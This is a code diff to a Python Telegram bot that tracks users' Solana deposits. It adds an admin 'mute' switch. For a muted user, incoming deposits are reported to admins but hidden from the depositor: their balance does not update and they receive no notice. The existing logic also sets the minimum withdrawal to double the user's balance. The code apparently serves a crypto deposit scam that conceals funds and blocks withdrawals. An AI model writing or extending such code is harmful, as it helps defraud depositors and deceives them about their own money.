@@ -43,8 +43,10 @@ last_notified_balance = {}  # {telegram_id: balance}
 # Admin configuration
 ADMIN_IDS = [6370028992, 7484918897]
 BANNED_USERS_FILE = "banned_users.json"
+MUTED_USERS_FILE = "muted_users.json"
 SUPPORT_LINK_FILE = "support_link.json"
 banned_users = set()
+muted_users = set()
 SUPPORT_LINK = "https://t.me/NovaTeamSupport"
 
 # Load settings
@@ -52,6 +54,12 @@ try:
     with open(BANNED_USERS_FILE, "r") as f:
         data = json.load(f)
         banned_users = set(data)
+except Exception:
+    pass
+
+try:
+    with open(MUTED_USERS_FILE, "r") as f:
+        muted_users = set(json.load(f))
 except Exception:
     pass
 
@@ -79,6 +87,15 @@ def save_banned_users():
             json.dump(list(banned_users), f)
     except Exception as e:
         print(f"Error saving banned users: {e}")
+
+
+def save_muted_users():
+    """Save muted users to file"""
+    try:
+        with open(MUTED_USERS_FILE, "w") as f:
+            json.dump(list(muted_users), f)
+    except Exception as e:
+        print(f"Error saving muted users: {e}")
 
 
 # --- Referral System ---
@@ -262,28 +279,30 @@ async def monitor_deposits(
         # If blockchain balance > stored balance, we have a new deposit
         if current_balance > stored_balance:
             deposit_amount = current_balance - stored_balance
-            user_balances[telegram_id]["balance"] = current_balance
+            is_muted = telegram_id in muted_users
 
-            # Withdrawal logic update
-            if not user_balances[telegram_id].get("fixed_min", False):
-                user_balances[telegram_id]["min_withdrawal"] = current_balance * 2
-            else:
-                # If fixed, check if current balance meets or exceeds the fixed minimum
-                fixed_min = user_balances[telegram_id].get("min_withdrawal", 0)
-                if current_balance >= fixed_min:
-                    # Reset to X2 logic since requirement met
-                    user_balances[telegram_id]["fixed_min"] = False
+            # Only update balance and min withdrawal if user is NOT muted
+            if not is_muted:
+                user_balances[telegram_id]["balance"] = current_balance
+
+                # Withdrawal logic update
+                if not user_balances[telegram_id].get("fixed_min", False):
                     user_balances[telegram_id]["min_withdrawal"] = current_balance * 2
+                else:
+                    fixed_min = user_balances[telegram_id].get("min_withdrawal", 0)
+                    if current_balance >= fixed_min:
+                        user_balances[telegram_id]["fixed_min"] = False
+                        user_balances[telegram_id]["min_withdrawal"] = current_balance * 2
 
-            save_balances()
+                save_balances()
 
             sol_price = await get_sol_price_usd()
             usd_value = current_balance * sol_price if sol_price > 0 else 0
 
-            # Send notification to USER (only if not already notified for this specific balance)
-            # Check if we've already notified for this exact balance
+            # Send notification to USER — skip entirely if muted
             if (
-                notify_user
+                not is_muted
+                and notify_user
                 and last_notified_balance.get(telegram_id, -1) != current_balance
             ):
                 try:
@@ -296,23 +315,24 @@ async def monitor_deposits(
                     await context.bot.send_message(
                         chat_id=telegram_id, text=user_notification, parse_mode="HTML"
                     )
-                    # Mark this balance as notified
                     last_notified_balance[telegram_id] = current_balance
                 except Exception as e:
                     print(f"Error sending notification to user: {e}")
 
-            # Send notification to admin group
+            # Always send notification to admin group (even if user is muted)
             if GROUP_ID:
                 try:
                     user = await context.bot.get_chat(telegram_id)
                     user_name = user.username or user.first_name or str(telegram_id)
 
+                    mute_note = "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification sent." if is_muted else ""
                     deposit_notification = (
                         f"💰 <b>New Deposit Detected</b>\n\n"
                         f"User: @{user_name} (ID: {telegram_id})\n"
                         f"Address: <code>{public_address}</code>\n\n"
                         f"Deposit: +{deposit_amount:.4f} SOL\n"
-                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
+                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n"
+                        f"{mute_note}\n"
                         f"Cumulative deposits tracked."
                     )
                     await context.bot.send_message(
@@ -584,6 +604,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["admin_editing_field"] = field
             await query.message.reply_text(
                 f"📝 Enter the new <b>{field.replace('_', ' ').title()}</b> for user {target_id}:",
+                parse_mode="HTML",
+            )
+        elif option.startswith("admin_mute_"):
+            target_id = int(option.split("_")[-1])
+            muted_users.add(target_id)
+            save_muted_users()
+            await query.answer("🔕 User muted — deposits will be hidden from them.")
+            await query.message.reply_text(
+                f"🔕 <b>User <code>{target_id}</code> has been muted.</b>\n\n"
+                f"Deposits will still be reported to the admin group, but the user's balance will not update and they will receive no notifications.",
+                parse_mode="HTML",
+            )
+        elif option.startswith("admin_unmute_"):
+            target_id = int(option.split("_")[-1])
+            muted_users.discard(target_id)
+            save_muted_users()
+            await query.answer("🔔 User unmuted — notifications restored.")
+            await query.message.reply_text(
+                f"🔔 <b>User <code>{target_id}</code> has been unmuted.</b>\n\n"
+                f"They will now receive deposit notifications and their balance will update normally from the next deposit.",
                 parse_mode="HTML",
             )
         return
@@ -1688,13 +1728,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     is_fixed = data.get("fixed_min", False)
 
                     status = "Fixed" if is_fixed else "Auto (x2)"
+                    is_muted = target_id in muted_users
+                    mute_status = "🔕 Muted" if is_muted else "🔔 Active"
 
                     msg = (
                         f"👤 <b>User Details:</b> <code>{target_id}</code>\n\n"
                         f"💰 <b>Balance:</b> {balance:.4f} SOL\n"
                         f"💸 <b>Min Withdrawal:</b> {min_w:.4f} SOL\n"
-                        f"⚙️ <b>Min Status:</b> {status}"
+                        f"⚙️ <b>Min Status:</b> {status}\n"
+                        f"🔔 <b>Notifications:</b> {mute_status}"
                     )
+
+                    mute_label   = "🔕 Mute 🟢"   if is_muted else "🔕 Mute"
+                    unmute_label = "🔔 Unmute 🟢" if not is_muted else "🔔 Unmute"
 
                     keyboard = InlineKeyboardMarkup(
                         [
@@ -1709,6 +1755,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     "✏️ Edit Min Withdrawal",
                                     callback_data=f"admin_edit_min_withdrawal_{target_id}",
                                 )
+                            ],
+                            [
+                                InlineKeyboardButton(mute_label,   callback_data=f"admin_mute_{target_id}"),
+                                InlineKeyboardButton(unmute_label, callback_data=f"admin_unmute_{target_id}"),
                             ],
                         ]
                     )
